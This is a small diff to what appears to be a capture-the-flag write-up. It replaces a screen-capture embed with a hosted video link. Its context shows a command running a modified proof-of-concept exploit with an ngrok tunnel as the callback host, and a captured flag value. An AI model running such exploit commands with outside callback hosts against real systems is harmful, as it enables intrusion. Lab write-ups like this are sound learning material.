@@ -57,7 +57,8 @@ running the exploit script:
 ```
 ./poc-modified.py --userip 0.tcp.ap.ngrok.io --webport 9000 --lport 13352
 ```
-![screencapture1](assets/screencapture1.mp4)
+
+https://user-images.githubusercontent.com/65378401/179755448-99039bdb-7cf0-4edf-9896-1b7c9bc55ba5.mp4
 
 Flag 1 Captured: `FLAG{f6f7660539def9f18d140d2bde0c18f8}`
 
